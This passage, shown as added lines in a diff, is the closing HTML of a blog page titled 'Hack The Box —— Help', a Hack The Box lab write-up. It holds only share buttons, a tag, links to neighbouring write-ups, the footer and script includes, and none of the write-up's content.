+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2019/09/hacktheboxhelp/" data-title="Hack The Box —— Help"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2019/09/hacktheboxhelp/" data-title="Hack The Box —— Help"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2019/09/hacktheboxhelp/" data-title="Hack The Box —— Help"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/htb%E9%9D%B6%E5%9C%BA/">HTB靶场</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2019/09/hacktheboxtenten/" class="prev" rel="prev" title="Hack The Box —— Tenten"><i class="fas fa-angle-left fa-fw"></i>Hack The Box —— Tenten</a>
+            <a href="/2019/09/hacktheboxblocky/" class="next" rel="next" title="Hack The Box —— Blocky">Hack The Box —— Blocky<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
